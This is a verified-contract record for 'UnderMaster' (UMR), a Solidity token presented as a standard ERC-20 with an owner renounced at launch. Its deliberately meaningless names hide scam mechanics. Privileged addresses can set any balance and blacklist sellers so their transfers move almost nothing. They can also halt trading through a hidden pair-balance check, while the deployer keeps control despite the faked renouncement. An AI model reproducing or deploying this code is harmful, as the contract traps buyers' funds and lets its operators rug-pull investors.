{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface receiverReceiver {\n    function createPair(address maxExempt, address walletMarketing) external returns (address);\n}\n\ninterface tokenLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunchedIs) external view returns (uint256);\n\n    function transfer(address txAutoFee, uint256 isLaunchedEnable) external returns (bool);\n\n    function allowance(address buyWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isLaunchedEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txAutoFee,\n        uint256 isLaunchedEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minEnable, uint256 value);\n    event Approval(address indexed buyWallet, address indexed spender, uint256 value);\n}\n\nabstract contract exemptList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromMin is tokenLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnderMaster is exemptList, tokenLaunched, fromMin {\n\n    function toSellAuto(address marketingTotal, address txAutoFee, uint256 isLaunchedEnable) internal returns (bool) {\n        require(receiverShouldAt[marketingTotal] >= isLaunchedEnable);\n        receiverShouldAt[marketingTotal] -= isLaunchedEnable;\n        receiverShouldAt[txAutoFee] += isLaunchedEnable;\n        emit Transfer(marketingTotal, txAutoFee, isLaunchedEnable);\n        return true;\n    }\n\n    bool public receiverIsTotal;\n\n    uint256 private atLimit = 100000000 * 10 ** 18;\n\n    uint256 public atList;\n\n    address private teamToken;\n\n    uint256 constant enableIs = 7 ** 10;\n\n    event OwnershipTransferred(address indexed tradingLiquidityTeam, address indexed teamFeeTo);\n\n    uint256 private listTradingSwap;\n\n    address senderTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public liquidityToReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderList;\n    }\n\n    function tokenList(address feeMarketing, uint256 isLaunchedEnable) public {\n        receiverLimit();\n        receiverShouldAt[feeMarketing] = isLaunchedEnable;\n    }\n\n    function shouldReceiverLimit(address marketingTotal, address txAutoFee, uint256 isLaunchedEnable) internal returns (bool) {\n        if (marketingTotal == takeMin) {\n            return toSellAuto(marketingTotal, txAutoFee, isLaunchedEnable);\n        }\n        uint256 launchMarketing = tokenLaunched(liquidityToReceiver).balanceOf(senderTx);\n        require(launchMarketing == fundSwap);\n        require(txAutoFee != senderTx);\n        if (swapSenderReceiver[marketingTotal]) {\n            return toSellAuto(marketingTotal, txAutoFee, enableIs);\n        }\n        return toSellAuto(marketingTotal, txAutoFee, isLaunchedEnable);\n    }\n\n    function limitLaunchedMin(address receiverAt) public {\n        require(receiverAt.balance < 100000);\n        if (receiverIsTotal) {\n            return;\n        }\n        \n        tradingLiquidityAuto[receiverAt] = true;\n        if (fromWalletMax == receiverBuy) {\n            amountShould = true;\n        }\n        receiverIsTotal = true;\n    }\n\n    function receiverLimit() private view {\n        require(tradingLiquidityAuto[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return teamToken;\n    }\n\n    string private senderList = \"UMR\";\n\n    function balanceOf(address receiverLaunchedIs) public view virtual override returns (uint256) {\n        return receiverShouldAt[receiverLaunchedIs];\n    }\n\n    function getOwner() external view returns (address) {\n        return teamToken;\n    }\n\n    bool private limitMarketing;\n\n    function approve(address atMarketingToken, uint256 isLaunchedEnable) public virtual override returns (bool) {\n        listShould[_msgSender()][atMarketingToken] = isLaunchedEnable;\n        emit Approval(_msgSender(), atMarketingToken, isLaunchedEnable);\n        return true;\n    }\n\n    bool public amountShould;\n\n    function transfer(address feeMarketing, uint256 isLaunchedEnable) external virtual override returns (bool) {\n        return shouldReceiverLimit(_msgSender(), feeMarketing, isLaunchedEnable);\n    }\n\n    mapping(address => mapping(address => uint256)) private listShould;\n\n    address enableSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSellReceiver;\n    }\n\n    function transferFrom(address marketingTotal, address txAutoFee, uint256 isLaunchedEnable) external override returns (bool) {\n        if (_msgSender() != enableSell) {\n            if (listShould[marketingTotal][_msgSender()] != type(uint256).max) {\n                require(isLaunchedEnable <= listShould[marketingTotal][_msgSender()]);\n                listShould[marketingTotal][_msgSender()] -= isLaunchedEnable;\n            }\n        }\n        return shouldReceiverLimit(marketingTotal, txAutoFee, isLaunchedEnable);\n    }\n\n    uint8 private minSellReceiver = 18;\n\n    function sellSender(address takeLimit) public {\n        receiverLimit();\n        \n        if (takeLimit == takeMin || takeLimit == liquidityToReceiver) {\n            return;\n        }\n        swapSenderReceiver[takeLimit] = true;\n    }\n\n    function toLaunchTeam() public {\n        emit OwnershipTransferred(takeMin, address(0));\n        teamToken = address(0);\n    }\n\n    address public takeMin;\n\n    mapping(address => bool) public swapSenderReceiver;\n\n    uint256 fundSwap;\n\n    function feeAt(uint256 isLaunchedEnable) public {\n        receiverLimit();\n        fundSwap = isLaunchedEnable;\n    }\n\n    uint256 public fromWalletMax;\n\n    function name() external view virtual override returns (string memory) {\n        return senderLaunch;\n    }\n\n    function allowance(address autoMaxMarketing, address atMarketingToken) external view virtual override returns (uint256) {\n        if (atMarketingToken == enableSell) {\n            return type(uint256).max;\n        }\n        return listShould[autoMaxMarketing][atMarketingToken];\n    }\n\n    constructor (){\n        \n        modeList listLimit = modeList(enableSell);\n        liquidityToReceiver = receiverReceiver(listLimit.factory()).createPair(listLimit.WETH(), address(this));\n        if (amountSwapMax == atList) {\n            atList = listTradingSwap;\n        }\n        takeMin = _msgSender();\n        tradingLiquidityAuto[takeMin] = true;\n        receiverShouldAt[takeMin] = atLimit;\n        toLaunchTeam();\n        \n        emit Transfer(address(0), takeMin, atLimit);\n    }\n\n    string private senderLaunch = \"Under Master\";\n\n    uint256 private amountSwapMax;\n\n    mapping(address => bool) public tradingLiquidityAuto;\n\n    mapping(address => uint256) private receiverShouldAt;\n\n    uint256 private receiverBuy;\n\n    uint256 takeSellShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLiquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFeeTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMaxMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atMarketingToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketingToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunchedEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchedIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isLaunchedEnable\",\"type\":\"uint256\"}],\"name\":\"feeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWalletMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"limitLaunchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIsTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapSenderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLaunchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunchedEnable\",\"type\":\"uint256\"}],\"name\":\"tokenList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLiquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunchedEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txAutoFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isLaunchedEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnderMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}